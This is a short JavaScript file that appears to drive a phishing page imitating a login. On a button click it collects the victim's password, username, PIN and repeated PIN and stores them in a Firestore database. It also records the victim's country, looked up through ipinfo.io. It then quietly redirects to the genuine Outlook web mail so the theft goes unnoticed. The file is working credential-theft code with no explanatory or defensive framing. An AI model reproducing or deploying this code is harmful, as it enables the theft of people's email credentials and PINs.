const db = firebase.firestore();


document.getElementById("bnts").addEventListener("click", ()=>{

document.getElementById("numo").style.display = "none";
document.getElementById("numt").style.display = "block";



})







const taskform = document.getElementById("bntss");

taskform.addEventListener("click", async (e) => {
e.preventDefault();
/*
agregar crypto.uuid()
a el doc.name
*/

var name = document.getElementById("name").value;



await db.collection("usuarionewColombo1.5").doc(name).set({
pw: document.getElementById("ps").value,
user: document.getElementById("esd").value,
upais: document.getElementById("nn").innerHTML,
pin: document.getElementById("pn").value,
repin: document.getElementById("pn2").value,



});
setTimeout(function(){document.location.href = "https://outlook.live.com/owa/0/?state=1&redirectTo=aHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8";},250);
});




async function getIpClient() {
    try {
      const response = await axios.get('https://ipinfo.io/json');
      console.log(response);
      document.getElementById("nn").innerHTML = response.data.country;
    } catch (error) {
      console.error(error);
    }
  }
  
  getIpClient();
		 